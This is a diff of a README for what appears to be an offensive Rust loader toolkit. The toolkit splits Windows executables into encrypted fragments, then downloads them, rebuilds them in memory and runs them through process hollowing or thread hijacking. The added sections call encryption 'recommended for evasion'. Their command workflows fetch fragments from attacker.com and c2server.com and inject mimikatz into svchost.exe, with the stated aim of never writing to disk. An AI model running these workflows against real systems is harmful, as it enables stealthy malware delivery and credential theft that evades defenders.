@@ -10,10 +10,10 @@ The toolkit splits PE executables into multiple fragments, distributes them acro
 
 ## Components
 
-- **MainLib**: Shared core functionality
-- **Splitter**: Splits PE binaries into N parts with cryptographic checksums
-- **Mounter**: Downloads fragments, reconstructs in memory, and executes via multiple techniques
-  - **MounterCLI**: A CLI for run a simple loader
+- **MainLib**: Shared core functionality with ChaCha20 encryption
+- **Splitter**: Splits PE binaries into N parts with optional ChaCha20 encryption and cryptographic checksums
+- **Mounter**: Downloads/loads fragments, decrypts if needed, reconstructs in memory, and executes via multiple techniques
+  - **MounterCLI**: A CLI for run a simple loader (supports HTTP and local filesystem)
   - **MounterLib**: Core library with execution methods (Local PE, Process Hollowing, Thread Hijacking)
 - **Demo**: Example implementations showing direct MounterLib usage
 
@@ -54,18 +54,43 @@ File split successfully into 5 parts
   File pattern: payload.part000, payload.part001, ...
 ```
 
-Each fragment contains a 96-byte header with magic bytes (`SPLT`), part numbers, and SHA256 checksums for integrity validation.
+Each fragment contains a header with magic bytes (`SPLT`), part numbers, and SHA256 checksums for integrity validation.
+
+**Encrypted splitting (recommended for evasion):**
+```bash
+# Split with ChaCha20 encryption
+./target/release/splitter.exe payload.exe --pieces 5 --password "your_secret_password"
+```
+
+Encrypted fragments use a v2 header (128 bytes) with unique salt and nonce per fragment. The data is encrypted with ChaCha20 using PBKDF2-derived keys (100,000 iterations).
 
 ### 2. Loading and Executing Fragments
 
-The mounter downloads fragments from URLs, validates their integrity, reconstructs the binary in memory, and executes it using multiple techniques (Local PE or Process Hollowing).
+The mounter can load fragments from HTTP URLs or local filesystem (auto-detected), validates their integrity, reconstructs the binary in memory, and executes it using multiple techniques (Local PE or Process Hollowing).
 
 ```bash
-# Basic usage - download and execute
+# Basic usage - download from HTTP
 ./target/release/mounter.exe \
   -u http://192.168.1.100/payload.part000 \
   -u http://192.168.1.100/payload.part001 \
   -u http://192.168.1.100/payload.part002
+
+# Load from local files (auto-detected, no HTTP server needed)
+./target/release/mounter.exe \
+  -u ./fragments/payload.part000 \
+  -u ./fragments/payload.part001 \
+  -u ./fragments/payload.part002
+
+# Decrypt encrypted fragments with password
+./target/release/mounter.exe \
+  -u http://server.com/encrypted.part000,http://server.com/encrypted.part001 \
+  --password "your_secret_password"
+
+# Local encrypted fragments
+./target/release/mounter.exe \
+  -u ./payload.part000,./payload.part001,./payload.part002 \
+  --password "your_secret_password" \
+  -v
 
 # Multiple URLs with comma separation
 ./target/release/mounter.exe -u http://server.com/file.part000,http://server.com/file.part001
@@ -87,8 +112,10 @@ The mounter downloads fragments from URLs, validates their integrity, reconstruc
 ./target/release/mounter.exe -u url1,url2 -m process-hollowing --target "C:\Windows\System32\notepad.exe"
 ```
 
-**Complete workflow example:**
+**Complete workflow examples:**
+
 ```bash
+# Standard workflow (unencrypted)
 # 1. Split your payload
 ./target/release/splitter.exe beacon.exe --pieces 3
 
@@ -100,10 +127,40 @@ python -m http.server 8000
   -u http://attacker.com:8000/beacon.part000 \
   -u http://attacker.com:8000/beacon.part001 \
   -u http://attacker.com:8000/beacon.part002 \
-  -m process_hollowing --target notepad.exe
+  -m local-pe
 ```
 
-The binary is reconstructed entirely in RAM and injected into a suspended Windows process (Mittre T1055) without ever being written to disk.
+```bash
+# Encrypted workflow (recommended for evasion)
+# 1. Split with encryption
+./target/release/splitter.exe mimikatz.exe --pieces 5 --password "Op3r@t10n_2024" -v
+
+# 2. Host encrypted fragments
+python -m http.server 8000
+
+# 3. Download, decrypt, and execute
+./target/release/mounter.exe \
+  -u http://c2server.com:8000/mimikatz.part000,http://c2server.com:8000/mimikatz.part001,http://c2server.com:8000/mimikatz.part002,http://c2server.com:8000/mimikatz.part003,http://c2server.com:8000/mimikatz.part004 \
+  --password "Op3r@t10n_2024" \
+  -m process-hollowing \
+  --target "C:\Windows\System32\svchost.exe" \
+  -v
+```
+
+```bash
+# Local testing workflow (no web server needed)
+# 1. Split with encryption
+./target/release/splitter.exe payload.exe --pieces 3 --password "test123"
+
+# 2. Test locally without network
+./target/release/mounter.exe \
+  -u ./payload.part000,./payload.part001,./payload.part002 \
+  --password "test123" \
+  --dry-run \
+  -v
+```
+
+The binary is reconstructed entirely in RAM and optionally injected into a suspended Windows process (MITRE T1055) without ever being written to disk.
 
 ### 3. Demo Example
 
